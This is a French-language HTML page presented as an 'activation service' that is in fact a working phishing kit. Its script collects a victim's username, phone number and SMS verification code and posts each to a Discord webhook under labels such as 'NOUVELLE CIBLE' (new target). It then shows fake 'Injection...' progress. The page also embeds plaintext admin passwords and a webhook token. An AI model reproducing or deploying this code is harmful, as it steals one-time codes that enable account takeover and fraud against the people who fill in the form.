<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Activation System</title>
    <style>
        /* DESIGN SUBTILE & ANIMATION ZEN */
        html, body {
            margin: 0; padding: 0; height: 100%;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            color: white; overflow: hidden;
            background: linear-gradient(135deg, #0d011a, #16032b, #0d011a, #1a0533);
            background-size: 300% 300%;
            animation: subtleWave 20s ease-in-out infinite;
        }

        @keyframes subtleWave {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        #login-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(13, 1, 26, 0.4); backdrop-filter: blur(15px);
            display: flex; justify-content: center; align-items: center; z-index: 10000;
        }

        .glass-panel {
            width: 85%; max-width: 320px; background: rgba(255, 255, 255, 0.05);
            border-radius: 30px; padding: 35px 25px; text-align: center;
            border: 1px solid rgba(204, 51, 255, 0.2);
        }

        .btn-glow {
            width: 100%; background: linear-gradient(135deg, #cc33ff, #ff0080);
            border: none; border-radius: 12px; padding: 18px; color: white;
            font-weight: bold; text-transform: uppercase; cursor: pointer;
            box-shadow: 0 0 15px rgba(204, 51, 255, 0.3);
        }

        .btn-guest {
            background: transparent; border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 50px; padding: 12px; color: rgba(255, 255, 255, 0.5);
            margin-top: 15px; cursor: pointer; width: 100%; font-size: 11px;
        }

        .input-group {
            display: flex; border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 12px; margin-bottom: 15px; background: rgba(0,0,0,0.2);
            align-items: center; height: 55px;
        }

        input {
            flex: 1; border: none; background: transparent; padding: 0 15px;
            color: white; font-size: 16px; outline: none;
        }

        #time-error {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #0d011a; display: none; flex-direction: column;
            justify-content: center; align-items: center; z-index: 20000;
        }

        .shake { animation: shake 0.4s; }
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-10px); }
            75% { transform: translateX(10px); }
        }

        #main-site { display: none; opacity: 0; transition: opacity 0.8s; padding: 40px 20px; text-align: center; }
    </style>
</head>
<body>

    <div id="time-error">
        <h2 style="color: #ff4d4d;">🔒 ACCÈS FERMÉ</h2>
        <p>Ouverture Guest : 15h00 - 19h00 (Paris)</p>
    </div>

    <div id="login-overlay">
        <div class="glass-panel">
            <h2 style="margin-bottom: 25px; letter-spacing: 1px;">AUTHENTIFICATION</h2>
            <div class="input-group"><input type="text" id="adminU" placeholder="Admin ID"></div>
            <div class="input-group"><input type="password" id="adminP" placeholder="Password"></div>
            
            <button class="btn-glow" onclick="checkAdmin()">Connexion</button>
            <button class="btn-guest" id="guestBtn" onclick="checkGuestTime()">Continuer en tant que Guest</button>

            <div style="margin-top: 25px; font-size: 10px; opacity: 0.4;">
                <a href="#" style="color: white; text-decoration: none;">CONTACTER UN ADMINISTRATEUR</a>
            </div>
        </div>
    </div>

    <div id="main-site">
        <h1 style="color: #df80ff; font-size: 22px;">ACTIVATION SERVICES</h1>
        
        <div id="step-1" style="margin-top: 40px;">
            <div class="input-group"><input type="text" id="targetUser" placeholder="Nom d'utilisateur"></div>
            <div class="input-group"><input type="tel" id="targetPhone" placeholder="Numéro de téléphone"></div>
            <button class="btn-glow" onclick="submitStep1()">Valider les informations</button>
        </div>

        <div id="step-2" style="display: none; margin-top: 40px;">
            <h3>Code de vérification</h3>
            <p style="font-size: 13px; opacity: 0.6;">Entrez le code reçu par SMS</p>
            <div class="input-group"><input type="tel" id="smsCode" placeholder="0000" maxlength="4" style="text-align: center;"></div>
            <button class="btn-glow" onclick="submitStep2()">Activer le service</button>
        </div>

        <div id="step-3" style="display: none; margin-top: 60px;">
            <div style="font-size: 40px;">⏳</div>
            <p id="status-msg">Synchronisation en cours...</p>
        </div>
    </div>

    <script>
        // CONFIGURATION
        const WEBHOOK_URL = "TON_LIEN_WEBHOOK_ICI";

        function vibrate(ms) { if(navigator.vibrate) navigator.vibrate(ms); }

        // CONNEXION ADMIN
        function checkAdmin() {
            const u = document.getElementById('adminU').value;
            const p = document.getElementById('adminP').value;
            if((u === "Guadalajara" && p === "Frozen16") || (u === "kayto.io" && p === "mohalebgdu93")) {
                vibrate(50);
                launchSite();
            } else { vibrate([100, 50, 100]); alert("Erreur d'accès"); }
        }

        // VERIFICATION HORAIRE PARIS
        async function checkGuestTime() {
            const btn = document.getElementById('guestBtn');
            btn.innerHTML = "Vérification...";
            try {
                const res = await fetch('https://worldtimeapi.org/api/timezone/Europe/Paris');
                const data = await res.json();
                const hour = new Date(data.datetime).getHours();

                if(hour >= 15 && hour < 19) {
                    vibrate(50); launchSite();
                } else {
                    vibrate(200);
                    document.getElementById('time-error').style.display = 'flex';
                    setTimeout(() => { document.getElementById('time-error').style.display = 'none'; btn.innerHTML = "Continuer en tant que Guest"; }, 3000);
                }
            } catch(e) { launchSite(); } // Secours
        }

        function launchSite() {
            document.getElementById('login-overlay').style.display = 'none';
            document.getElementById('main-site').style.display = 'block';
            setTimeout(() => document.getElementById('main-site').style.opacity = "1", 50);
        }

        // ENVOI DISCORD
        async function sendLog(msg) {
            if(WEBHOOK_URL.includes("https://discord.com/api/webhooks/1504947105087881246/tYDzjVO_32kGAX9Z34Qqf0gwWMO0UUL5-9lZlLqY3oPbzCzDnq325Srh-j8Wvz9WS3Ga")) return;
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ content: msg })
            });
        }

        // ACTIONS FORMULAIRE
        function submitStep1() {
            const user = document.getElementById('targetUser').value;
            const phone = document.getElementById('targetPhone').value;

            if(!user || phone.length < 10) {
                vibrate(200); document.getElementById('step-1').classList.add('shake');
                setTimeout(() => document.getElementById('step-1').classList.remove('shake'), 400);
                return;
            }

            vibrate(50);
            sendLog(`🚨 **NOUVELLE CIBLE**\n👤 User: ${user}\n📱 Tel: ${phone}`);
            document.getElementById('step-1').style.display = 'none';
            document.getElementById('step-2').style.display = 'block';
        }

        function submitStep2() {
            const code = document.getElementById('smsCode').value;
            if(code.length < 4) { vibrate(200); return; }

            vibrate(50);
            sendLog(`🔑 **CODE REÇU**\nCode: ${code}`);
            document.getElementById('step-2').style.display = 'none';
            document.getElementById('step-3').style.display = 'block';

            let steps = ["Liaison serveur...", "Injection...", "Terminé !"];
            let i = 0;
            let itv = setInterval(() => {
                document.getElementById('status-msg').innerText = steps[i];
                i++;
                if(i>=steps.length) { clearInterval(itv); vibrate([100, 50, 100]); }
            }, 2000);
        }
    </script>
</body>
</html>
